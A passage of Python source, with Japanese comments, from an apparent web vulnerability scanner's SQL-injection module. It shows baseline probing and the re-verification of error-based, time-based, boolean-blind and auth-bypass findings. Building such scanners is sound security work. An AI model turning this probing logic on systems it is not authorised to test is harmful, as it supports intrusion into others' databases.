        """Get a baseline response with a safe value."""
        # baseline もフィールド投入なので監査ログに残す（log_payload_test 一元化の不変条件）。
        await self.log_payload_test(
            ip.display_name or ip.parameter_id,
            "baseline_test",
            "sqli_baseline",
            ip.url,
        )
        try:
            return await self._apply_ip(ip, "baseline_test", baseline=True)
        except Exception as exc:
            if self.monitor:
                await self.monitor.emit_status(
                    f"[warn] sqli: baseline failed on {ip.parameter_id} @ {ip.url}: {exc}"
                )
            return "", {}

    async def _apply_ip(
        self,
        ip: InjectionPoint,
        payload,
        *,
        baseline: bool = False,
        **probe_context,
    ) -> tuple[str, dict]:
        """SQLi baseline の既存 browser 呼出し列を保って注入点 dispatch する。

        移行前の form baseline は再 navigate せず現在のページへ直接 submit していた。
        通常 payload の ``_apply_payload`` は navigate を行うため、baseline だけその差を
        明示して回帰を防ぐ。JSON は常に base の共有 transport を使う。
        """
        if baseline and ip.location != "json_body":
            if not self.may_scan_injection_point(ip):
                return "", {}
            # baseline は base._apply_ip を経由せず browser を直叩きするため、時間ボックス
            # gate をここにも適用する（さもないと budget 枯渇後も baseline 2回投入で同じ stored sink を
            # 再 flood しうる）。超過なら注入せず truncated 記録して短絡。
            if self._field_budget_gate():
                return "", {}
            if ip.location == "url_param":
                send = lambda: self.browser.test_url_param(ip.url, ip.parameter_id, payload)
            else:
                send = lambda: self.browser.fill_and_submit_form(ip.submit_index, ip.parameter_id, payload)
            return await self._send_probe(ip, send, role="baseline")
        if baseline:
            probe_context["probe_role"] = "baseline"
        return await super()._apply_ip(ip, payload, **probe_context)

    async def verify_finding(self, finding: Finding) -> bool | None:
        from urllib.parse import parse_qs, urlparse
        is_url_param = finding.field_name in parse_qs(
            urlparse(finding.url).query, keep_blank_values=True
        )
        if hasattr(finding, "injection_location"):
            ip = self._verify_injection_point(finding, is_url_param)
            if ip is None:
                return None
        else:
            # provenance 属性を持たない旧 Finding 互換（既存 unit の簡易 object を含む）。
            ip = (
                InjectionPoint.for_url_param(finding.url, finding.field_name)
                if is_url_param
                else InjectionPoint.for_form(finding.url, finding.field_name, 0)
            )
        await self.log_payload_test(
            finding.field_name, finding.payload, "sqli_verify", finding.url
        )
        # verify 中に session 失効(401/login リダイレクト等)すると、401/login 本文を
        # 脆弱性応答として評価し real finding を unreproduced に誤格下げしてしまう。
        # 失効・遮断を検知したら indeterminate(None)を返す（ブラウザ form/URL-param および json_body 共通）。
        self._mark_api_auth_failed(False)
        source, pair = await self._apply_ip(ip, finding.payload)
        current_url = self._current_page_url(finding.url)
        login_url, logged_in_marker = self._get_engine_auth_markers()
        match_err = bool(self.check_response_for_patterns(source, SQL_ERROR_PATTERNS))
        verify_reason = classify_sqli_response(
            status=_pair_status(pair),
            final_url=current_url,
            body=source,
            target_url=finding.url,
            login_url=login_url,
            logged_in_marker=logged_in_marker,
            has_sql_error=match_err,
        )
        if verify_reason:
            self._record_scan_note(f"auth_lost:{self.CHECK_TYPE}:{verify_reason}")
            self._mark_api_auth_failed(True)
            return None
        engine = getattr(self, "engine", None)
        if getattr(engine, "_api_auth_failed", False):
            return None
        body = pair.get("response", {}).get("body", "") or source or ""
        etype = getattr(finding, "evidence_type", "")
        if etype == "sqli_error":
            return bool(self.check_response_for_patterns(body, SQL_ERROR_PATTERNS))
        if etype == "sqli_time":
            threshold = float(finding.evidence_details.get("threshold_seconds", 2.5))
            sleep_elapsed = self.response_elapsed(pair)
            if sleep_elapsed is None:
                return self.response_time_exceeded(pair, threshold=threshold)
            if sleep_elapsed < threshold:
                return False
            # no-sleep の対照リクエストを計測し、SLEEP 応答が対照より十分に遅い
            # ことを要求する。恒常的に遅いだけのエンドポイント（対照との差が小さい）を
            # time-based 陽性と誤判定しないため（注入 SLEEP は約3秒なので 2 秒の差を要求）。
            await self.log_payload_test(finding.field_name, "1", "sqli_verify_control", finding.url)
            self._mark_api_auth_failed(False)
            if engine is not None:
                try:
                    engine._json_probe_failed = False
                except Exception:
                    pass
            _, control_pair = await self._apply_ip(ip, "1")
            # 対照リクエストが transport 失敗/失効したら、有効な対照を測れない。恒常的に
            # 遅いだけの endpoint を「対照が無いから」reproduced と誤確認しないよう、
            # indeterminate(None)を返す（_verify_one が terminal な assumed にする。）。
            if (
                getattr(engine, "_api_auth_failed", False)
                or getattr(engine, "_json_probe_failed", False)
            ):
                return None
            control_elapsed = self.response_elapsed(control_pair)
            if control_elapsed is None:
                return None  # 対照を測れない＝confirm できない（偽陽性回避）
            if (sleep_elapsed - control_elapsed) < 2.0:
                return False
            return True
        if etype == "sqli_auth_bypass":
            fresh_result = await self._verify_auth_bypass_fresh_context(finding, ip)
            if fresh_result is not None:
                return fresh_result
            try:
                bypassed, _ = self._detect_auth_bypass(finding.url, source, pair)
            except TypeError:
                bypassed, _ = self._detect_auth_bypass(finding.url, source)
            return bypassed
        if etype == "sqli_boolean":
            details = finding.evidence_details or {}
            true_payload = details.get("true_payload")
            false_payload = details.get("false_payload")
            if not true_payload or not false_payload:
                return None
            self._mark_api_auth_failed(False)
            baseline_source, baseline_pair = await self._get_baseline(ip)
            base_url = self._current_page_url(finding.url)
            if classify_sqli_response(
                status=_pair_status(baseline_pair),
                final_url=base_url,
                body=baseline_source,
                target_url=finding.url,
                login_url=login_url,
                logged_in_marker=logged_in_marker,
            ):
                self._mark_api_auth_failed(True)
                return None

            await self.log_payload_test(finding.field_name, true_payload, "sqli_verify_boolean", finding.url)
            true_src, true_pair = await self._apply_ip(ip, true_payload)
            true_url = self._current_page_url(finding.url)
            if classify_sqli_response(
                status=_pair_status(true_pair),
                final_url=true_url,
                body=true_src,
                target_url=finding.url,
                login_url=login_url,
                logged_in_marker=logged_in_marker,
            ):
                self._mark_api_auth_failed(True)
                return None

            await self.log_payload_test(finding.field_name, false_payload, "sqli_verify_boolean", finding.url)
            false_src, false_pair = await self._apply_ip(ip, false_payload)
            false_url = self._current_page_url(finding.url)
            if classify_sqli_response(
                status=_pair_status(false_pair),
                final_url=false_url,
                body=false_src,
                target_url=finding.url,
                login_url=login_url,
                logged_in_marker=logged_in_marker,
            ):
                self._mark_api_auth_failed(True)
                return None

            # boolean verify は初回 replay 後に baseline/true/false と複数回 replay する。
            # その途中で session 失効(401)しても _api_auth_failed が立つので、いずれかで
            # 失効したら login/401 本文を SQL 応答と比較せず indeterminate(None)を返す。
            if getattr(engine, "_api_auth_failed", False):
                return None
            baseline_len = len(baseline_source)
            baseline_variance = float(details.get("baseline_variance", 0) or 0)
            # 検知時と同じ純粋関数で再確認する（検知と検証の判定を一致させ、検知できた
            # boolean-blind を verify で取りこぼして格下げしないため）。
            return _boolean_blind_divergence(
                baseline_len,
                baseline_variance,
                len(true_src),
                len(false_src),
                self._body_similarity(true_src, baseline_source),
                self._body_similarity(false_src, baseline_source),
                _pair_status(baseline_pair),
                _pair_status(true_pair),
                _pair_status(false_pair),
            )
        if etype == "sqli_concat_equivalence":
            # Re-run the concatenation-equivalence probe; injectable again ⇒ verified.
            result = await self.run_equivalence_probe(
                finding.url, ip.form_index, finding.field_name, is_url_param,
                context="sql", dom_index=ip.submit_index,
            )
            return result is not None
        return None

    async def _verify_auth_bypass_fresh_context(
        self,
        finding: Finding,
        ip: InjectionPoint | None = None,
    ) -> bool | None:
        """Re-test auth bypass in a clean browser context to avoid session/dialog noise."""
        try:
            from wscan.browser import BrowserManager
            timeout_seconds = max(1, int(getattr(self.browser, "timeout", 30000) / 1000))
            browser = BrowserManager(
                headless=getattr(self.browser, "headless", True),
                timeout=timeout_seconds,
                monitor=None,
                auth_user=getattr(self.browser, "auth_user", ""),
                auth_pass=getattr(self.browser, "auth_pass", ""),
                proxy=getattr(self.browser, "proxy", ""),
                sleep_factor=getattr(self.browser, "sleep_factor", 1.0),
            )
            await browser.init()
            previous_browser = self.browser
            self.browser = browser
            try:
                await self.log_payload_test(
                    finding.field_name, finding.payload, "sqli_verify", finding.url
                )
                # 直接呼び出す既存テストでは従来どおり form index=0 を使う。
                verify_ip = ip or InjectionPoint.for_form(
                    finding.url, finding.field_name, 0
                )
                source, pair = await self._apply_ip(verify_ip, finding.payload)
                try:
                    bypassed, _ = self._detect_auth_bypass(finding.url, source, pair)
                except TypeError:
                    bypassed, _ = self._detect_auth_bypass(finding.url, source)
                return bypassed
            finally:
                self.browser = previous_browser
                await browser.close()
        except Exception:
            return None

    async def _apply_payload(
        self,
        url: str,
        form_index: int,
        field_name: str,
        payload: str,
        is_url_param: bool,
    ) -> tuple[str, dict]:
        """Apply a payload to the target field."""
        try:
            if is_url_param:
                return await self.browser.test_url_param(url, field_name, payload)
            else:
                # Re-navigate to the page before each test
                await self.browser.navigate(url)
                return await self.browser.fill_and_submit_form(
                    form_index, field_name, payload
                )
        except Exception as exc:
            self._probe_failure(self._probe_exception_outcome(exc))
            self._record_scan_note(
                f"transport_error:{self.CHECK_TYPE}:{type(exc).__name__}"
            )
            if self.monitor:
                await self.monitor.emit_status(
                    f"[warn] sqli: _apply_payload failed on {field_name} @ {url}: {exc}"
                )
            return "", {}
